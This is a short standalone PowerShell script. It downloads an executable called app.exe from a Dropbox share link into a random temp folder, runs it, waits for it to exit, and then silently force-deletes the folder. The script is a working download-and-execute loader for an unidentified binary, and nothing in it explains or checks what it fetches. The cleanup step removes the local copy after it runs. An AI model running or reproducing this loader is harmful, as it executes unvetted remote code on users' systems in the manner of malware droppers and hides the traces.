$url = "https://www.dropbox.com/scl/fi/bmhzfsr1jozvewn6nf58f/app.exe?rlkey=nczxbpok66yan9ikshrupo0pm&st=2niocezv&dl=1"  
$tempdir = "$env:TEMP\$(New-Guid)" 
mkdir $tempdir | Out-Null
$file = "$tempdir\app.exe" 

try {
    irm -Uri $url -OutFile $file -ErrorAction Stop 
    $proc = Start-Process $file -PassThru -Wait 
    Write-Host "Process exited with code: $($proc.ExitCode)"  
} catch {
    Write-Error "An error occurred: $_"  
} finally {
    ri $tempdir -Recurse -Force -ErrorAction SilentlyContinue  }
